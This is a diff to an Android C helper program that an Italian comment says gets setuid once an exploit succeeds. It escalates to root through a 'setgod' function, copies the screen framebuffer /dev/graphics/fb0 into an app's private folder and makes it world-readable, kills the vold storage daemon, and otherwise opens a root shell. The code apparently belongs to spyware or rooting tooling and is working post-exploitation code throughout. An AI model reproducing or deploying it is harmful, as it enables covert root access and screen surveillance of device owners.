@@ -20,30 +20,40 @@
 #include <errno.h>
 #include <jni.h>
 #include <android/log.h>
+#include <dirent.h>
 
 #define LOG(x)  printf(x)
 
 static int copy(const char *from, const char *to);
+unsigned int getProcessId(const char *p_processname);
+int setgod();
 
 // questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
 
 // statuslog -c "/system/bin/cat /dev/graphics/fb0"
 int main(int argc, char** argv) {
-	seteuid(0);
-	setegid(0);
-	setuid(0);
-	setgid(0);
+	int i;
+	setgod();
 
-	char buf[128];
-	sprintf(buf, "Exploit Status: EUID: %d, UID: %d\n", geteuid(), getuid());
-	LOG(buf);
+	if (argc == 2) {
+		if (strcmp(argv[1], "fb") == 0) {
+			char* filename = "/data/data/com.android.service/files/frame";
 
-	if ( argc == 2 && strcmp(argv[1], "fb") == 0) {
-		char* filename = "/data/data/com.android.service/files/frame";
-		copy("/dev/graphics/fb0", filename);
-		chmod("/data/data/com.android.service/files/frame", 0666);
+			copy("/dev/graphics/fb0", filename);
+			chmod("/data/data/com.android.service/files/frame", 0666);
+		} else if (strcmp(argv[1], "vol") == 0) {
+			unsigned int pid;
+
+			for (i = 0; i < 2; i++) {
+				pid = getProcessId("vold");
+
+				if (pid) {
+					kill(getProcessId("vold"), SIGKILL);
+					sleep(2);
+				}	
+			}
+		}
 	} else {
-
 		const char * shell = "/system/bin/sh";
 		LOG("Starting shell\n");
 
@@ -51,9 +61,11 @@ int main(int argc, char** argv) {
 		exec_args[argc] = NULL;
 		exec_args[0] = "sh";
 		int i;
+
 		for (i = 1; i < argc; i++) {
 			exec_args[i] = argv[i];
 		}
+
 		execv("/system/bin/sh", exec_args);
 
 		LOG("Exiting shell\n");
@@ -95,3 +107,76 @@ static int copy(const char *from, const char *to) {
 	return r;
 }
 
+unsigned int getProcessId(const char *p_processname) {
+    DIR *dir_p;
+    struct dirent *dir_entry_p;
+    char dir_name[128];
+    char target_name[252];
+    int target_result;
+    char exe_link[252];
+    int errorcount;
+    int result;
+    char msg[256];
+
+    errorcount = 0;
+    result = 0;
+
+    if (setgod()) {
+        LOG("We are in GOD mode\n");
+    } else {
+        LOG("We are NOT in GOD mode!\n");
+    }
+
+    dir_p = opendir("/proc/");
+
+    while (NULL != (dir_entry_p = readdir(dir_p))) {
+        if (strspn(dir_entry_p->d_name, "0123456789") == strlen(dir_entry_p->d_name)) {
+            strcpy(dir_name, "/proc/");
+            strcat(dir_name, dir_entry_p->d_name);
+            strcat(dir_name, "/");
+
+            exe_link[0] = 0;
+            strcat(exe_link, dir_name);
+            strcat(exe_link, "exe");
+            target_result = readlink(exe_link, target_name, sizeof(target_name) - 1);
+
+            if (target_result > 0) {
+                target_name[target_result] = 0;
+
+                if (strstr(target_name, p_processname) != NULL) {
+                    result = atoi(dir_entry_p->d_name);
+
+                    sprintf(msg, "getProcessID(%s) id = %d\n", p_processname, result);
+                    LOG(msg);
+
+                    closedir(dir_p);
+                    return result;
+                }
+            }
+        }
+    }
+
+    closedir(dir_p);
+
+    sprintf(msg, "getProcessID(%s) id = 0 (could not find process)\n", p_processname);
+    LOG(msg);
+
+    return result;
+}
+
+int setgod() {
+    char buf[512];
+
+    //sprintf(buf, "Actuald UID: %d, GID: %d, EUID: %d, EGID: %d\n", getuid(), getgid(), geteuid(), getegid());
+    //LOG(buf);
+
+    setegid(0);
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+
+    //sprintf(buf, "Actuald UID: %d, GID: %d, EUID: %d, EGID: %d, err: %d\n", getuid(), getgid(), geteuid(), getegid(), errno);
+    //LOG(buf);
+
+    return (seteuid(0) == 0) ? 1 : 0;
+}
